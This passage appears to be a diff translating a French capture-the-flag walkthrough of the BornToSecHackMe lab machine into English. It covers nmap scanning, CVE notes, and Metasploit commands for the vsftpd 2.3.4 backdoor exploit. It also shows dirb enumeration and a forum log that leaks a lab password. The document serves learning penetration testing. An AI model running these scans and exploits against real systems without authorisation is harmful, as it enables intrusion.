@@ -1,10 +1,10 @@
-#### I - Trouver l'ip de la machine
+#### I - Find the machine's IP
 ``nmap -sn 192.168.31.0/24``
 >Nmap scan report for BornToSecHackMe (**192.168.31.26**)
 
 ----
 
-#### II - On verifie les services ouverts sur tous les ports
+#### II - We check the services open on all ports
 ``nmap -p- -sV 192.168.31.26``
 >Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 20:55 CEST
 >Nmap scan report for BornToSecHackMe (192.168.31.26)
@@ -21,17 +21,17 @@
 
 ----
 
-#### III - On etudie les failles connues sur les services
+#### III - We study known flaws in services
 **SSH :**
-CVE-2016-0777 : Permet à un serveur malveillant d'exfiltrer des données privées du client en envoyant un paquet SSH2_MSG_UNIMPLEMENTED en réponse à une requête SSH_FXP_INIT.
+CVE-2016-0777 : Allows a malicious server to exfiltrate private client data by sending an SSH2_MSG_UNIMPLEMENTED packet in response to an SSH_FXP_INIT request.
 
 **Apache httpd 2.2.22 :**
-CVE-2017-7679: Une vulnérabilité dans le module mod_mime peut permettre à un attaquant d'exécuter du code arbitraire à distance.
+CVE-2017-7679: A vulnerability in the mod_mime module can allow an attacker to execute arbitrary code remotely.
 [-] https://192.168.31.26:443
 -> The target is not vulnerable to CVE-2021-42013 (requires mod_cgi to be enabled).
 
 **VSFTPD :**
-backdoor dans la version 2.3.4
+backdoor in v2.3.4
 msf6 > search vsftpd
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
@@ -43,16 +43,16 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 
 ----
 
-#### III - On etudie l'arborescence du site
+#### III - We study the tree structure of the site
 
-Avec ``dirb``, sur le https, on trouve ceci d'interessant :
+With ``dirb``, on https, we find this interesting:
 
 ##### /forum
 - type : my little forum
-- On fouille le forum et on trouve un post :
+- We search the forum and find a post:
 >Probleme login ?
 
-A l'interieur on etudie les logs et on se rend compte que l'utilisateur a du tenter de mettre son mot de passe a la place du login ici :
+Inside we study the logs and we realize that the user must have tried to put his password instead of the login here:
 >Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user **!q\]Ej?*5K5cy*AJ** from 161.202.39.38 port 57764 ssh2
 
 On connait deja son login grace a plusieurs lignes dont celle-ci :
